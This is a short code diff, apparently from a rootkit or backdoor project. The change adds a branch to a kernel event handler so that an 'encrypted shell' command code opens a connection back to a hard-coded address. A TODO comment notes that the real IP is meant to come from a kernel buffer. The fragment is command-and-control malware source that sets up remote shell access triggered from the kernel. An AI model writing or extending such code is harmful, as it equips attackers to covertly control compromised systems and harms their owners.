@@ -109,8 +109,9 @@ static int handle_rb_event(void *ctx, void *data, size_t data_size){
 		printf("%s COMMAND  pid:%d code:%i\n", ts, e->pid, e->code);
 		switch(e->code){
 			case CC_PROT_COMMAND_ENCRYPTED_SHELL:
+			//TODO EXTRACT IP FROM KERNEL BUFFER
 				printf("Starting encrypted connection\n");
-				
+				client_run("127.0.1.1", 8500);
             	break;
 			default:
 				printf("Command received unknown: %d\n", e->code);
